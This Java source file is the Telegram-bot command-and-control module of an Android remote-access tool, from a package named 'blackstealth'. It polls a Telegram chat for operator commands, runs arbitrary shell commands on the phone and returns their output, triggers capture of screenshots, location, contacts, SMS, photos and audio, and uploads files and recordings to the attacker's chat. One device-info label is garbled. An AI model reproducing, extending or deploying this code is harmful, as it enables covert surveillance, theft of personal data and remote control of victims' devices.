package com.offensive.blackstealth.c2_channels;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import javax.net.ssl.*;

/**
 * Telegram Bot C2 Channel
 * Uses Telegram Bot API for covert C2 communication
 */
public class TelegramC2 {
    private static final String TAG = "TelegramC2";
    private static final String TELEGRAM_API = "https://api.telegram.org/bot";
    
    private String botToken;
    private String chatId;
    private String deviceId;
    private long lastUpdateId = 0;
    private ExecutorService executor;
    private boolean isRunning = false;
    private CommandCallback callback;
    
    public interface CommandCallback {
        void onCommand(String command, String messageId);
        void onError(String error);
    }
    
    public TelegramC2(String botToken, String chatId, String deviceId) {
        this.botToken = botToken;
        this.chatId = chatId;
        this.deviceId = deviceId;
        this.executor = Executors.newFixedThreadPool(3);
    }
    
    public void setCallback(CommandCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Start polling for commands
     */
    public void start() {
        if (isRunning) return;
        isRunning = true;
        
        // Send registration message
        sendMessage("🔗 Device registered: " + deviceId + "\n" +
                   "📱 Model: " + android.os.Build.MODEL + "\n" +
                   "🤖 Android: " + android.os.Build.VERSION.RELEASE);
        
        // Start polling loop
        executor.submit(this::pollLoop);
        
        Log.i(TAG, "Telegram C2 started");
    }
    
    public void stop() {
        isRunning = false;
        executor.shutdownNow();
    }
    
    /**
     * Poll for new messages
     */
    private void pollLoop() {
        while (isRunning) {
            try {
                String url = TELEGRAM_API + botToken + "/getUpdates" +
                           "?offset=" + (lastUpdateId + 1) +
                           "&timeout=30" +
                           "&allowed_updates=[\"message\"]";
                
                String response = httpGet(url);
                
                if (response != null && response.contains("\"ok\":true")) {
                    parseUpdates(response);
                }
                
                Thread.sleep(1000);
                
            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
                try { Thread.sleep(10000); } catch (Exception ex) {}
            }
        }
    }
    
    /**
     * Parse Telegram updates
     */
    private void parseUpdates(String response) {
        try {
            // Simple JSON parsing for updates
            int resultStart = response.indexOf("\"result\":[");
            if (resultStart == -1) return;
            
            int pos = resultStart;
            while (true) {
                // Find update_id
                int updateIdStart = response.indexOf("\"update_id\":", pos);
                if (updateIdStart == -1) break;
                
                int updateIdEnd = response.indexOf(",", updateIdStart);
                long updateId = Long.parseLong(
                    response.substring(updateIdStart + 12, updateIdEnd).trim());
                
                if (updateId > lastUpdateId) {
                    lastUpdateId = updateId;
                    
                    // Find message text
                    int textStart = response.indexOf("\"text\":\"", updateIdStart);
                    if (textStart != -1 && textStart < response.indexOf("}", updateIdStart + 100)) {
                        int textEnd = response.indexOf("\"", textStart + 8);
                        String text = response.substring(textStart + 8, textEnd);
                        
                        // Check if message is from our chat
                        int chatIdStart = response.indexOf("\"id\":", updateIdStart);
                        if (chatIdStart != -1) {
                            int chatIdEnd = response.indexOf(",", chatIdStart);
                            String msgChatId = response.substring(chatIdStart + 5, chatIdEnd).trim();
                            
                            if (msgChatId.equals(chatId)) {
                                processCommand(text, String.valueOf(updateId));
                            }
                        }
                    }
                }
                
                pos = updateIdStart + 20;
                if (pos >= response.length()) break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Parse error: " + e.getMessage());
        }
    }
    
    /**
     * Process received command
     */
    private void processCommand(String text, String messageId) {
        // Commands should start with /
        if (!text.startsWith("/")) return;
        
        String[] parts = text.substring(1).split(" ", 2);
        String command = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";
        
        // Check if command is for this device
        if (command.contains("_")) {
            String[] cmdParts = command.split("_", 2);
            if (!cmdParts[0].equals(deviceId) && !cmdParts[0].equals("all")) {
                return; // Command not for us
            }
            command = cmdParts[1];
        }
        
        Log.i(TAG, "Received command: " + command);
        
        // Handle built-in commands
        switch (command) {
            case "ping":
                sendMessage("🏓 Pong! Device " + deviceId + " is alive");
                break;
                
            case "info":
                sendDeviceInfo();
                break;
                
            case "shell":
                executeShell(args);
                break;
                
            case "screenshot":
                if (callback != null) callback.onCommand("screenshot", messageId);
                break;
                
            case "location":
                if (callback != null) callback.onCommand("location", messageId);
                break;
                
            case "contacts":
                if (callback != null) callback.onCommand("contacts", messageId);
                break;
                
            case "sms":
                if (callback != null) callback.onCommand("sms", messageId);
                break;
                
            case "photo":
                if (callback != null) callback.onCommand("photo", messageId);
                break;
                
            case "record":
                if (callback != null) callback.onCommand("record:" + args, messageId);
                break;
                
            default:
                if (callback != null) callback.onCommand(command + ":" + args, messageId);
        }
    }
    
    /**
     * Send device info
     */
    private void sendDeviceInfo() {
        StringBuilder info = new StringBuilder();
        info.append("📱 *Device Info*\n\n");
        info.append("🆔 ID: `").append(deviceId).append("`\n");
        info.append("📱 Model: ").append(android.os.Build.MODEL).append("\n");
        info.append("�icing: ").append(android.os.Build.MANUFACTURER).append("\n");
        info.append("🤖 Android: ").append(android.os.Build.VERSION.RELEASE).append("\n");
        info.append("🔧 SDK: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
        
        sendMessage(info.toString());
    }
    
    /**
     * Execute shell command
     */
    private void executeShell(String command) {
        executor.submit(() -> {
            try {
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(
                    new InputStreamReader(process.getErrorStream()));
                
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                while ((line = errorReader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                
                process.waitFor();
                
                String result = output.toString();
                if (result.length() > 4000) {
                    result = result.substring(0, 4000) + "\n... (truncated)";
                }
                
                sendMessage("```\n" + result + "```");
                
            } catch (Exception e) {
                sendMessage("❌ Error: " + e.getMessage());
            }
        });
    }
    
    /**
     * Send text message
     */
    public void sendMessage(String text) {
        executor.submit(() -> {
            try {
                String url = TELEGRAM_API + botToken + "/sendMessage";
                String data = "chat_id=" + chatId +
                            "&text=" + URLEncoder.encode(text, "UTF-8") +
                            "&parse_mode=Markdown";
                
                httpPost(url, data);
            } catch (Exception e) {
                Log.e(TAG, "Send message failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Send photo
     */
    public void sendPhoto(byte[] imageData, String caption) {
        executor.submit(() -> {
            try {
                String url = TELEGRAM_API + botToken + "/sendPhoto";
                
                String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
                
                URL urlObj = new URL(url);
                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                
                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                
                // Chat ID
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                os.writeBytes(chatId + "\r\n");
                
                // Caption
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                os.writeBytes(caption + "\r\n");
                
                // Photo
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n");
                os.writeBytes("Content-Type: image/jpeg\r\n\r\n");
                os.write(imageData);
                os.writeBytes("\r\n");
                
                os.writeBytes("--" + boundary + "--\r\n");
                os.flush();
                os.close();
                
                conn.getResponseCode();
                conn.disconnect();
                
            } catch (Exception e) {
                Log.e(TAG, "Send photo failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Send document
     */
    public void sendDocument(byte[] data, String filename, String caption) {
        executor.submit(() -> {
            try {
                String url = TELEGRAM_API + botToken + "/sendDocument";
                
                String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
                
                URL urlObj = new URL(url);
                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                
                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                os.writeBytes(chatId + "\r\n");
                
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                os.writeBytes(caption + "\r\n");
                
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n");
                os.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                os.write(data);
                os.writeBytes("\r\n");
                
                os.writeBytes("--" + boundary + "--\r\n");
                os.flush();
                os.close();
                
                conn.getResponseCode();
                conn.disconnect();
                
            } catch (Exception e) {
                Log.e(TAG, "Send document failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Send audio
     */
    public void sendAudio(byte[] audioData, String filename) {
        executor.submit(() -> {
            try {
                String url = TELEGRAM_API + botToken + "/sendVoice";
                
                String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
                
                URL urlObj = new URL(url);
                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                
                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                os.writeBytes(chatId + "\r\n");
                
                os.writeBytes("--" + boundary + "\r\n");
                os.writeBytes("Content-Disposition: form-data; name=\"voice\"; filename=\"" + filename + "\"\r\n");
                os.writeBytes("Content-Type: audio/ogg\r\n\r\n");
                os.write(audioData);
                os.writeBytes("\r\n");
                
                os.writeBytes("--" + boundary + "--\r\n");
                os.flush();
                os.close();
                
                conn.getResponseCode();
                conn.disconnect();
                
            } catch (Exception e) {
                Log.e(TAG, "Send audio failed: " + e.getMessage());
            }
        });
    }
    
    private String httpGet(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(35000);
        conn.setReadTimeout(35000);
        
        if (conn.getResponseCode() == 200) {
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            return response.toString();
        }
        return null;
    }
    
    private void httpPost(String urlString, String data) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setConnectTimeout(10000);
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        
        OutputStream os = conn.getOutputStream();
        os.write(data.getBytes());
        os.flush();
        os.close();
        
        conn.getResponseCode();
        conn.disconnect();
    }
}
